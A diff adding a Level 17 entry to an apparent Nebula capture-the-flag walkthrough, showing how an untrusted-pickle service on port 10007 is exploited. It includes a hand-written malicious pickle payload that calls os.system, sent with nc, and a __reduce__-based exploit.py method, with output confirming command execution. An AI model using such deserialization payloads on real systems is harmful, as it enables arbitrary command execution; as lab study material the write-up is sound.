@@ -222,7 +222,44 @@ next level pass:
 
 Level 17
 ---------------------------
+http://nadiana.com/python-pickle-insecure
+http://docs.python.org/library/pickle.html
+"Warning The pickle module is not intended to be secure against erroneous or 
+maliciously constructed data. Never unpickle data received from an untrusted 
+or unauthenticated source."
 
+Method1:
+~/pickled:
+cos
+system
+(S'getflag > /tmp/out2'
+tR.
+
+$ cat pickled | nc localhost 10007
+Accepted connection from 127.0.0.1:53001
+^C
+level17@nebula:~$ cat /tmp/out2
+You have successfully executed getflag on a target account
+
+Method2:
+Create an object that, when unpickled, will run a specified command, 
+in it's __reduce__() function. The print it's pickled representation and feed 
+it to the script running on 10007.
+(more on this: http://blog.nelhage.com/2011/03/exploiting-pickle/)
+
+python exploit.py  | nc 127.0.0.1 10007
+Accepted connection from 127.0.0.1:53002
+^C
+level17@nebula:~$ cat /tmp/out_exp
+You have successfully executed getflag on a target account
+
+next level pass: 
+
+Level 18
+---------------------------
+
+
+--------
 It shall be done.
 Ghost reportin'
 Jacked up and good to go
